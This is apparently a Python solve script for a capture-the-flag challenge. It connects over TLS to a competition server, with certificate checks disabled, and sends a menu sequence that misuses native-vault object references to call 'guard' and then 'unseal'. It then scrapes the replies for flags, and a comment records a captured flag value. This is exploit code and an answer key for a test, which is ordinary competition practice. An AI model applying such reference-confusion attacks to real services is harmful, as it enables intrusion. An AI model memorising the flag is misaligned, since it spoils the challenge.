import socket, ssl, time, sys, re

HOST = "d7aea6306a25afccb76a1e58.tcp-ctf2.dasctf.com"
PORT = 9999
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
s = socket.create_connection((HOST,PORT),timeout=10); s = ctx.wrap_socket(s, server_hostname=HOST)

LOG = []
def idle_read(timeout=1.2, idle=0.35):
    s.settimeout(timeout); buf=b""
    while True:
        try: d=s.recv(4096)
        except socket.timeout: break
        if not d: break
        buf+=d
        s.settimeout(idle)
    t = buf.decode("utf-8","replace")
    LOG.append(t)
    return t

def tx(line, wait=0.12):
    s.sendall((line+"\r\n").encode()); time.sleep(wait)
    return idle_read()

CLS = "com/example/native_vault/NativeVault"
seq = [
    ("2", "class>"),
    (CLS, None),
    ("5", "local ref>"),
    ("L1", None),
    ("7", None),
    ("3", "call"),
    (f"{CLS} guard ([BILjava/lang/Class;)V s:00 i:0 ref:G1", None),
    ("5", "local ref>"),
    ("L2", None),
    ("10", "unseal"),
    ("G2 G1", None),
]
for line, _ in seq:
    out = tx(line)
    print(f"--- {line!r}\n{out}")

allout = "".join(LOG)
m = re.findall(r"(?:CTF2|flag|DASCTF|flag)\{[^}]*\}", allout)
print("FLAGS:", m)
# CTF2{ecebfd39-7a30-471f-8819-f80cfb26a546}